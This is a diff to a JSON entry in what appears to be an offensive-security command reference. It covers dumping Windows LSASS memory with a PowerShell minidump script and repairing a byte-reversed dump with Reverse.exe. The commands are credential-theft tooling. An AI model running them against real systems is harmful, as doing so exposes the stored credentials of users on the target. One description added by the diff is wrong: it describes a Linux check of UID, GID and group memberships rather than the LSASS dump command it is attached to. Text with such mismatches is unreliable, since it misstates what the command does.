@@ -31,11 +31,13 @@
   "variations": [
     {
       "label": "Create the LSASS dump on the target (managed minidump)",
-      "command": "powershell -c \"<minidump_script> -pid (Get-Process lsass).Id -output <dump_file>\""
+      "command": "powershell -c \"<minidump_script> -pid (Get-Process lsass).Id -output <dump_file>\"",
+      "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
     },
     {
       "label": "Un-reverse / repair a byte-reversed dump",
-      "command": "Reverse.exe \"<dump_file>\" \"<fixed_dump>\""
+      "command": "Reverse.exe \"<dump_file>\" \"<fixed_dump>\"",
+      "description": "Un-reverse / repair a byte-reversed dump. See the command syntax for exact parameters and flags."
     }
   ],
   "steps": [
